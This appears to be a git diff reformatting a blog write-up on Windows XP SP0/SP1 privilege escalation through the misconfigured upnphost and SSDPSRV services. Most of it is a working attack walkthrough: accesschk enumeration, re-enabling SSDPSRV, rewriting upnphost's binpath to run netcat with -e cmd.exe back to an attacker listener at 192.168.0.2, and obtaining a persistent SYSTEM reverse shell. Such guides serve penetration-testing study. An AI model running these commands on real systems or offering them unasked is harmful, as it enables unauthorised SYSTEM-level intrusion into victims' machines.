@@ -1,4 +1,13 @@
-[guide](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)
+---
+description: >-
+  Abusing upnphost and its SSDPSRV dependency
+title: upnphost and SSDPSRV             # Add title here
+date: 2023-02-03 08:00:00 -0600                           # Change the date to match completion date
+categories: [04 Privilege Escalation, Windows - upnphost and SSDPSRV]                     # Change Templates to Writeup
+tags: [windows privesc, upnphost, windows XP, vulnerable microsoft services]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
+show_image_post: false                                    # Change this to true
+#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
+---
 
 REQUIREMENTS: This article assumes that you have already obtained a low privilege shell on your victim's computer. You have enumerated this machine and concluded that the operating system is Windows XP with SP0 or SP1 installed.
 
@@ -21,13 +30,20 @@ When accesschk.exe is uploaded and we execute the latest version of accesschk.ex
 You can download older versions with the /accepteula parameter from [here](https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%0D) and [here](https://xor.cat/assets/other/Accesschk.zip)
 With that issue out of the way, let's continue. Once you have uploaded the older version of accesschk.exe to your victim, we can use it to look for vulnerable services we can exploit. We can do this with the following query:
 
-```c
-C:\> accesschk.exe /accepteula -uwcqv "Authenticated Users" * # If we are on a Windows XP SP0 or SP1 OS we will receive the following output RW SSDPSRV SERVICE_ALL_ACCESS RW upnphost SERVICE_ALL_ACCESS
+```powershell
+C:\> accesschk.exe /accepteula -uwcqv "Authenticated Users" * 
+
+# If we are on a Windows XP SP0 or SP1 OS we will receive the following output 
+
+RW SSDPSRV
+	SERVICE_ALL_ACCESS
+RW upnphost
+	SERVICE_ALL_ACCESS
 ```
 
 The output implies that we have access to two services from which we can edit the service parameters, named upnphost and SSDPSRV. Let's take a closer look at both services.
 
-```cmd
+```powershell
 SSDPSRV C:\> accesschk.exe /accepteula -ucqv SSDPSRV 
 SSDPSRV
 	RW NT AUTHORITY\SYSTEM 
@@ -39,8 +55,10 @@ SSDPSRV
 	RW BUILTIN\Power Users 
 		SERVICE_ALL_ACCESS 
 	RW NT AUTHORITY\LOCAL SERVICE 
-		SERVICE_ALL_ACCESS 
+		SERVICE_ALL_ACCESS
+
 # upnphost
+
 C:\> accesschk.exe /accepteula -ucqv upnphost 
 upnphost 
 	RW NT AUTHORITY\SYSTEM 
@@ -61,7 +79,7 @@ When we edit these services so they execute a binary of our choice, we can escal
 
 Before we exploit these services, let's check out how their parameters look at the moment.
 
-```cmd
+```powershell
 # upnphost 
 
 C:\> sc qc upnphost 
@@ -92,9 +110,9 @@ SERVICE_NAME: SSDPSRV
 	SERVICE_START_NAME : NT AUTHORITY\LocalService
 ```
 
-upnphost is the service we are going to use to escalate our privileges. As you can see upnphost has a dependency, it requires SSDPSRV to run aswel. If we take a look at the current status of SSDPSRV with the command sc query SSDPSRV we can see that the service is currently STOPPED. If we try to start this service, we will get an error, as shown below.
+upnphost is the service we are going to use to escalate our privileges. As you can see upnphost has a dependency, it requires SSDPSRV to run as well. If we take a look at the current status of SSDPSRV with the command `sc query SSDPSRV` we can see that the service is currently STOPPED. If we try to start this service, we will get an error, as shown below.
 
-```
+```powershell
 Query status
 
 C:\> sc query SSDPSRV
@@ -117,7 +135,7 @@ The service cannot be started, either because it is disabled or because it has n
 
 In order to fix this, we will need to set the SSDPSRV from DISABLED to AUTOMATIC. Once the service is set to AUTOMATIC we will be able to start it. We can do this with the following commands.
 
-```
+```powershell
 Set SSDPSRV to AUTOMATIC
 # NOTE: There is a space between = and auto. This is important, else the command will fail.
 
@@ -142,7 +160,7 @@ SERVICE_NAME: SSDPSRV
 
 SSDPSRV is successfully set to AUTOMATIC (AUTO_START)! Now let's try to start SSDPSRV again.
 
-```
+```powershell
 C:\> net start SSDPSRV
 The SSDP Discovery Service service is starting.
 The SSDP Discovery Service service was started successfully.
@@ -154,7 +172,7 @@ You can download the Windows executables (32bit and 64bit) from Netcat [here](h
 
 Once nc.exe is uploaded to your victim, take note of its current path, because we will need it now we are going to edit the parameters from the upnphost service. Execute the commands below to edit the path of the binary that the upnphost service will execute when it's started.
 
-```
+```powershell
 # Set new binary path (don't forget the space after binpath=)
 # Syntax
 C:\> sc config upnphost binpath= "C:\nc.exe -nv [ip] [port] -e C:\WINDOWS\System32\cmd.exe"
@@ -170,7 +188,7 @@ C:\> sc config upnphost obj= ".\LocalSystem" password= ""
 
 Our upnphost service should now be ready to execute our nc.exe binary and connect back to a listener we will set up on our attacking machine. Let's do one last check of our upnphost service and make sure everything is as it should be.
 
-```
+```powershell
 C:\> sc qc upnphost
 [SC] GetServiceConfig
 
@@ -194,7 +212,7 @@ root@kali> nc -lvnp 4444
 
 We are now ready to start the upnphost service and execute our reverse shell via the new binary path we provided.
 
-```cmd
+```powershell
 C:\> net start upnphost
 ```
 
@@ -209,8 +227,10 @@ root@kali> nc -lvnp 4445
 
 Next, prepare a payload to send once our connection to the first listener on port 4444 is established. We can simply copy the payload we added in the binary path from our upnphost service, and change the port to the port of our 2nd listener.
 
-```c
+```powershell
 C:\nc.exe -nv 192.168.0.2 4445 -e C:\WINDOWS\System32\cmd.exe
 ```
 
 Finally we're ready to get a steady SYSTEM shell. Start the upnphost service again, a new connection will be established to our listener on port 4444. Once this shell is open, paste your payload we just created for a new connection to our listener on port 4445 and execute it. When we now check our listener in TAB 2, we will have a steady SYSTEM shell that will not close after a while.
+
+[guide](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)
